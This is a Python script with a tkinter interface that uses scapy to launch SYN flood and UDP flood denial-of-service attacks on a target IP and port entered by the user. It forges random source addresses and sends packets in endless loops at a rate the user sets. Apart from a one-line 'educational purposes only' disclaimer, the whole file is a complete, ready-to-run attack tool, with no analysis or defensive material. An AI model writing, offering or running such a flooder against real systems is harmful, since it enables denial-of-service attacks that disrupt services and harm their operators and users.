import tkinter as tk
from scapy.all import *
import threading
import random
import time

# Educational disclaimer message
DISCLAIMER = """
This tool is for educational purposes only. Unauthorized use is prohibited.
"""

def syn_flood(target_ip, target_port, packet_rate):
    """Performs a SYN flood attack by sending packets at a specified rate."""
    while True:
        src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))  # Random source IP
        seq_num = random.randint(1000, 9000)  # Random sequence number
        ip = IP(src=src_ip, dst=target_ip)
        syn = TCP(dport=target_port, flags="S", seq=seq_num)
        pkt = ip/syn
        send(pkt, verbose=0)
        time.sleep(1 / packet_rate)  # Control the attack speed

def udp_flood(target_ip, target_port, packet_rate):
    """Performs a UDP flood attack by sending packets at a specified rate."""
    while True:
        src_ip = ".".join(str(random.randint(0, 255)) for _ in range(4))  # Random source IP
        ip = IP(src=src_ip, dst=target_ip)
        udp = UDP(dport=target_port, sport=random.randint(1024, 65535))
        pkt = ip/udp
        send(pkt, verbose=0)
        time.sleep(1 / packet_rate)  # Control the attack speed

def start_attack():
    """Starts the selected attack in a separate thread."""
    target_ip = ip_entry.get()
    try:
        target_port = int(port_entry.get())
        packet_rate = float(rate_entry.get())
        attack_type = attack_type_var.get()
        if packet_rate <= 0:
            raise ValueError("Packet rate must be greater than zero.")

        if attack_type == "SYN Flood":
            attack_thread = threading.Thread(target=syn_flood, args=(target_ip, target_port, packet_rate))
        elif attack_type == "UDP Flood":
            attack_thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_rate))
        
        attack_thread.daemon = True
        attack_thread.start()
        status_label.config(text=f"{attack_type} started on {target_ip}:{target_port} at {packet_rate} packets/sec")
    except ValueError as e:
        status_label.config(text=f"Error: {e}")

# Set up the GUI window
window = tk.Tk()
window.title("Educational Flood Tool")
window.geometry("450x350")

# Disclaimer section
disclaimer_label = tk.Label(window, text=DISCLAIMER, fg="red", wraplength=400, justify="center")
disclaimer_label.pack(pady=10)

# Add labels and entry fields
ip_label = tk.Label(window, text="TARGET IP:")
ip_label.pack(pady=5)
ip_entry = tk.Entry(window)
ip_entry.pack(pady=5)

port_label = tk.Label(window, text="PORT:")
port_label.pack(pady=5)
port_entry = tk.Entry(window)
port_entry.pack(pady=5)

rate_label = tk.Label(window, text="PACKETS PER SECOND:")
rate_label.pack(pady=5)
rate_entry = tk.Entry(window)
rate_entry.pack(pady=5)

attack_type_label = tk.Label(window, text="ATTACK TYPE:")
attack_type_label.pack(pady=5)
attack_type_var = tk.StringVar(value="SYN Flood")
attack_type_menu = tk.OptionMenu(window, attack_type_var, "SYN Flood", "UDP Flood")
attack_type_menu.pack(pady=5)

# Start attack button
attack_button = tk.Button(window, text="Start Attack", command=start_attack)
attack_button.pack(pady=20)

# Status label to show the status of the attack
status_label = tk.Label(window, text="")
status_label.pack(pady=10)

# Run the GUI
window.mainloop()
